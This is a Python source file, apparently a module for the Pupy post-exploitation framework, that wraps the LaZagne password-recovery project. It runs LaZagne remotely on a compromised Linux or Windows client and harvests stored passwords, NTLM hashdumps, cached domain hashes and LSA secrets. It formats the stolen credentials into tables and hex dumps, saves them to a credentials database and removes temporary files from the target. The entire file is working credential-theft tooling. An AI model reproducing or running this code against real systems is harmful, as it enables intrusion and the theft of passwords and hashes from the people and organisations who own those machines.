# -*- coding: utf-8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.utils.credentials import Credentials
from pupylib.utils.term import colorize, terminal_size
from pupylib.utils.rpyc_utils import obtain

__class_name__="LaZagne"

@config(cat="creds", compat=["linux", "windows"])
class LaZagne(PupyModule):
    """
        retrieve passwords stored on the target
    """

    dependencies = {
        'all': [ 'whole', 'sqlite3', 'xml', 'calendar',
                'memorpy', 'ConfigParser', 'Crypto.Util.asn1',
                'Crypto.PublicKey', 'lazagne', 'laZagne'],
        'linux': [ 'secretstorage', 'crypt' ],
        'windows': [ 'sqlite3.dll' ],
    }

    FILTER = ''.join([
        (len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)
    ])

    TYPESMAP = {
        'password': 'plaintext',
        'hash': 'hash',
        'key': 'key',
        'cmd': 'cmd',
    }

    NON_TABLE = set([
        'Ssh', 'Secretstorage'
    ])

    FILTER_COLUMNS = set([
        'CredType', 'Category', 'SavePassword'
    ])

    @classmethod
    def init_argparse(cls):
        header = '|====================================================================|\n'
        header += '|                                                                    |\n'
        header += '|                        The LaZagne Project                         |\n'
        header += '|                                                                    |\n'
        header += '|                          ! BANG BANG !                             |\n'
        header += '|                                                                    |\n'
        header += '|====================================================================|\n\n'

        cls.arg_parser = PupyArgumentParser(prog="lazagne", description=header + cls.__doc__)
        cls.arg_parser.add_argument('category', nargs='?', help='specify category', default='all')

    def run(self, args):
        db = Credentials(
            client=self.client.short_name(), config=self.config
        )

        whole = self.client.remote('whole', 'to_strings_list', False)
        runLaZagne = self.client.remote('laZagne', 'runLaZagne', False)

        first_user = True
        passwordsFound = False

        results = obtain(whole(
            runLaZagne,
            category_choosed=args.category, raise_on_exception=False))

        for r in results:
            if r[0] == 'User':
                if not passwordsFound and not first_user:
                    self.warning('no passwords found !')

                first_user = False
                passwordsFound = False
                user = r[1]
                if type(user) == str:
                    user = user.decode('utf-8', errors='replace')

                self.log(colorize(u'\n########## User: {} ##########'.format(user), 'yellow'))

            elif r[2]:
                passwordsFound = True
                try:
                    self.print_results(r[0], r[1], r[2], db)
                except Exception, e:
                    self.error('{}: {}'.format(r[1], e))

        if not passwordsFound:
            self.warning('no passwords found !')

        # clean temporary file if present
        try:
            self.client.conn.modules['laZagne'].clean_temporary_files()
        except AttributeError:
            pass

    def print_module_title(self, module):
        self.log(colorize(
            '\n------------------- {} -------------------\n'.format(
                module.encode('utf-8', errors='replace')
            ), 'yellow'
        ))

    # print hex value
    def dump(self, src, length=8):
        if type(src) == unicode:
            src = src.encode('latin1')
        N=0
        result=''
        while src:
            s,src = src[:length],src[length:]
            hexa = ' '.join(["%02X"%ord(x) for x in s])
            s = s.translate(self.FILTER)
            result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
            N += length
        return result

    def hashdump_to_dict(self, creds):
        results = []

        for cred in creds:
            for pwd in cred:
                try:
                    user, rid, lm, nt, _, _, _ = pwd.split(':')
                    results.append({
                        'Category' : 'hashdump',
                        'CredType' : 'hash',
                        'Login'    : user,
                        'Hash'     : '%s:%s' % (str(lm), str(nt))
                    })
                except:
                    pass

        return results

    def cachedump_to_dict(self, creds):
        results = []

        for cred in creds:
            for pwd in creds[0]:
                try:
                    user, d, dn, h = pwd.split(':')
                    results.append({
                        'Category' : 'cachedump',
                        'CredType' : 'hash',
                        'Login'    : user,
                        'Hash'     : '%s:%s:%s:%s' % (user.lower(), h.encode('hex'), d.lower(), dn.lower())
                    })
                except:
                    pass

        return results

    def creds_to_dict(self, creds, module):
        try:
            if module.lower() == 'hashdump':
                return self.hashdump_to_dict(creds)
            elif module.lower() == 'cachedump':
                return self.cachedump_to_dict(creds)
        except:
            return []

        results = []

        if type(creds) == str:
            raise Exception(creds)

        for cred in creds:
            if isinstance(cred, dict):
                result = {
                    'Category' : module
                }

                for c in cred.keys():
                    result[c] = self.try_utf8(cred[c]).strip()

                    for t, name in self.TYPESMAP.iteritems():
                        if t in set(x.lower() for x in result):
                            result['CredType'] = name

                    if not result.get('CredType'):
                        result['CredType'] = 'empty'

                    results.append(result)

        return results

    def try_utf8(self, value):
        if type(value) == unicode:
            try:
                return value.encode('utf-8')
            except:
                return value.encode('latin1', errors='ignore')
        else:
            return str(value)

    def prepare_fields(self, items, remove=[]):
        if not items:
            return []

        items = [
            {
                k:self.try_utf8(v) for k,v in item.iteritems() if not k in remove
            } for item in items
        ]

        keys = set()
        for item in items:
            for k in item:
                keys.add(k)

        colinfo = {
            k:max([
                len(item.get(k, '')) for item in items
            ]) for k in keys
        }

        width, _ = terminal_size()

        truncate = None

        maxlen = sum(colinfo.values()) + len(colinfo)*2

        if maxlen > width:
            truncate = max(colinfo.keys(), key=lambda k: colinfo[k])
            maxsize = colinfo[truncate] - (maxlen - width)

        return [
            {
                k:(
                    item.get(k, '')[:maxsize] if k == truncate else item.get(k, '')
                ).strip() for k in keys
            } for item in items
        ]

    def filter_same(self, creds):
        return [
            dict(t) for t in frozenset([
                tuple(d.items()) for d in creds
            ])
        ]

    def print_lsa(self, creds):
        for cred in creds:
            for name, value in cred.iteritems():
                self.log(name)
                self.log(self.dump(value, length=16))
                self.log('')

    def print_results(self, success, module, creds, db):
        if not success:
            self.error(str(creds))
            return

        if not creds or all(not cred for cred in creds):
            return

        self.print_module_title(module)

        if module.lower() == 'lsa':
            self.print_lsa(creds)
        else:
            creds = self.filter_same(
                self.creds_to_dict(creds, module)
            )

            if not module in self.NON_TABLE:
                self.table(
                    self.prepare_fields(
                        creds, remove=self.FILTER_COLUMNS
                    ))
            else:
                for cred in creds:
                    for k, v in cred.iteritems():
                        if k in self.FILTER_COLUMNS:
                            continue
                        self.log(u'{}: {}'.format(k, v))
                    self.log('')

            try:
                db.add(creds)
            except Exception, e:
                self.error(u'{}: {}'.format(e))
